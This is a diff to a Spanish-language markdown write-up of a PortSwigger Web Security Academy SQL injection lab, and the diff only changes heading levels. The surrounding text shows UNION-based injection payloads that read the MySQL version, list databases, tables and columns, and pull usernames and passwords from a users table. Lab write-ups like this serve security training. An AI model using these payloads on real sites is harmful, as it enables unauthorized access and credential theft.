@@ -25,7 +25,7 @@ https://web-security-academy.net/filter?category=Gifts)
 
 ---
 
-## 1. Confirmación de la vulnerabilidad
+## Confirmación de la vulnerabilidad
 
 **Acción:**
 
@@ -48,13 +48,13 @@ Si la inyección tiene éxito, la página mostrará los valores `1` y `2`  en la
 
 ---
 
-### Obtener versión de MySQL
+## Obtener versión de MySQL
 
 ```sql
 ' UNION SELECT 1, @@version, 3, 4-- -
 ```
 
-### Listar todas las bases de datos
+## Listar todas las bases de datos
 
 ```sql
 ' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata-- -
@@ -69,7 +69,7 @@ Al ejecutar esta query, en el laboratorio de ejemplo de Portswigger vemos algo a
 
 ![Captura](./Imágenes/web_2.png)
 
-### Listar tablas de una base de datos
+## Listar tablas de una base de datos
 
 ```sql
 ' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema='nombre_base_datos'-- -
@@ -83,13 +83,13 @@ Al ejecutar esta query, en el laboratorio de ejemplo de Portswigger vemos algo a
 
 ![Captura](./Imágenes/web_4.png)
 
-### Listar columnas de una tabla
+## Listar columnas de una tabla
 
 ```sql
 ' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='nombre_tabla'-- -
 ```
 
-### Extraer usuarios de una tabla `users`
+## Extraer usuarios de una tabla `users`
 
 ```sql
 ' UNION SELECT 1, username, password, 4 FROM users-- -
